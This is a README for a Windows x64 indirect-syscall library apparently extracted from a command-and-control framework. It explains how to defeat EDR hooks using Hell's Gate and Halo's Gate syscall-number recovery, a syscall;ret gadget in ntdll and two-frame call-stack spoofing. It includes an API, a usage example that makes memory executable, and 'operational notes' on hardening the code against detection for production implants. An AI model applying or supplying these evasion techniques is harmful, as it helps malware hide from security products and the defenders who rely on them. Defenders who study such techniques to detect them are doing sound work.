# indirect-syscalls

Indirect syscalls with Hell's Gate + Halo's Gate SSN resolution and 2-frame call-stack spoofing for Windows x64.

Extracted from [KHAOS C2](https://github.com/28Zaaky/khaos-c2).

---

## What this solves

EDR products hook userland syscall stubs in ntdll by overwriting their first bytes with a JMP to a monitoring trampoline:

```
NtOpenProcess (hooked):
  E9 xx xx xx xx    JMP <edr_hook>
  ...

NtOpenProcess (clean):
  4C 8B D1          mov r10, rcx
  B8 26 00 00 00    mov eax, 0x26   ; SSN
  0F 05             syscall
  C3                ret
```

Two problems to solve:

1. **SSN recovery** — the `mov eax` is gone; we need to find the real syscall number.
2. **syscall origin** — even with the right SSN, a `syscall` instruction in our own code is flagged by telemetry that checks the source module. The instruction must appear to come from ntdll.

---

## How it works

### SSN resolution

**Hell's Gate** (unhooked stub):

```
fn[0..3] == 4C 8B D1 B8  →  SSN = *(uint16_t *)(fn + 4)
```

**Halo's Gate** (hooked stub — JMP trampoline at fn[0]):

Walk ntdll's EAT to find the position of `name` in the sorted name table, then scan neighbors ±32 positions for a clean `4C 8B D1 B8` stub. Since Nt* syscalls are numbered in sorted-name order, a clean neighbor at distance `d` has `SSN ± d`:

```
for d in 1..32:
    neighbor_at(idx - d) → SSN = neighbor_ssn + d
    neighbor_at(idx + d) → SSN = neighbor_ssn - d
```

### Indirect syscall gadget

Scan ntdll `.text` for the byte sequence `0F 05 C3` (`syscall; ret`). Any Nt* stub contains it. Jumping into this gadget makes ETW telemetry record the source as ntdll, not our implant.

### Call-stack spoofing

Before the jump to the gadget, two fake return addresses are pushed onto the stack:

```
[rsp+0x00] = ret in KernelBase .text   ← inner spoof frame
[rsp+0x08] = ret in ntdll .text        ← outer spoof frame
[rsp+0x10] = real return address (our code)
```

Stack walk during the syscall shows:
```
NtXxx → KernelBase!<somewhere> → ntdll!<somewhere> → [our code]
```

Rather than:
```
NtXxx → [our code]   ← obvious
```

### Argument remapping (`spoof_stub.S`)

Windows x64 calling convention → Nt* ABI:

```
rcx (ssn)  → eax          (syscall number)
rdx (a1)   → r10          (first Nt* arg — Nt* stubs do: mov r10,rcx; then syscall clobbers rcx)
r8  (a2)   → rdx
r9  (a3)   → r8
[+0x28] a4 → r9
[+0x28..0x58]: a5..a11 shifted down by 0x10 to account for the 2 pushed spoof frames
```

---

## API

```c
#include "indirect_syscall.h"

// Initialize — find gadgets. Call once before sc_ssn/sc_call.
// Returns 0 on success, -1 if ntdll has no syscall;ret sequence.
int sc_init(void);

// Resolve SSN for any Nt* function.
// Hell's Gate if stub is clean; Halo's Gate if hooked.
// Returns 0xFFFF on failure.
uint16_t sc_ssn(const char *name);

// Indirect syscall with call-stack spoofing.
// Caller must zero unused trailing args.
NTSTATUS sc_call(uint16_t ssn,
                 uintptr_t a1,  uintptr_t a2,  uintptr_t a3,
                 uintptr_t a4,  uintptr_t a5,  uintptr_t a6,
                 uintptr_t a7,  uintptr_t a8,  uintptr_t a9,
                 uintptr_t a10, uintptr_t a11);
```

### Example

```c
sc_init();

uint16_t ssn = sc_ssn("NtAllocateVirtualMemory");

HANDLE proc = (HANDLE)(LONG_PTR)-1;
PVOID  base = NULL;
SIZE_T sz   = 0x1000;

NTSTATUS st = sc_call(ssn,
    (uintptr_t)proc,
    (uintptr_t)&base,
    0,
    (uintptr_t)&sz,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE,
    0, 0, 0, 0, 0);
```

---

## Build

Requires MinGW-w64 cross-compiler.

```bash
make
./build/demo.exe
```

Expected output:

```
[+] sc_gadget  = 00007ffe2fd9fbe2  (syscall;ret in ntdll .text)
[+] sc_frame1  = 00007ffe2d2031c9  (KernelBase ret gadget)
[+] sc_frame2  = 00007ffe2fc441d9  (ntdll ret gadget)

[*] SSN NtAllocateVirtualMemory = 0x0018
[*] SSN NtProtectVirtualMemory  = 0x0050
[*] SSN NtFreeVirtualMemory     = 0x001E
[*] SSN NtWriteVirtualMemory    = 0x003A
[*] SSN NtOpenProcess           = 0x0026

[+] NtAllocateVirtualMemory: base=...  sz=0x1000  st=0x00000000
[+] NtProtectVirtualMemory: st=0x00000000  old_prot=0x4
[*] VirtualQuery Protect = 0x20  (expected 0x20 = PAGE_EXECUTE_READ)
[+] page is PAGE_EXECUTE_READ — indirect syscalls working correctly
```

---

## Limitations

- x64 only.
- Halo's Gate scans ±32 neighbors. If all 64 neighbors are hooked (uncommon), SSN resolution fails and `sc_ssn()` returns `0xFFFF`.
- Call-stack spoofing is 2 frames deep. A thorough stack inspection (unwind data validation, module range checks) will see our code at `[rsp+0x10]`. Full synthetic stack spoofing requires building proper unwind data and a complete ROP frame chain — out of scope for this PoC.
- `sc_ssn()` uses `strcmp` on EAT names, which are ASCII and sorted. This is standard EAT iteration with no obfuscation — replace with a hash walk in production.
- Gadget addresses change on every reboot (ASLR). `sc_init()` must be called in-process.

---

## Operational notes

This PoC uses `GetModuleHandleA`/`GetProcAddress` with plaintext strings. In production:

- Replace with a PEB walk (`__readgsqword(0x60)`) to resolve modules.
- Encrypt sensitive string literals (see EVS XOR in KHAOS C2).
- Call `sc_init()` early — before EDR DLLs load via `DLL_PROCESS_ATTACH` if possible.

The `sc_gadget` address can be cached; it points into ntdll `.text` which is stable within a process lifetime (even after ntdll unhooking, the `syscall;ret` bytes remain).

---

## Credits

Technique originally described by [Hell's Gate](https://github.com/am0nsec/HellsGate) (am0nsec / smelly__vx) and extended by [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) (Sektor7). Call-stack spoofing approach from [SilentMoonwalk](https://github.com/klezVirus/SilentMoonwalk) (klezVirus). This implementation integrates all three into a single compact dispatcher.

---

*Part of [KHAOS C2](https://github.com/28Zaaky/khaos-c2) — by [28Zaaky](https://github.com/28Zaaky)*
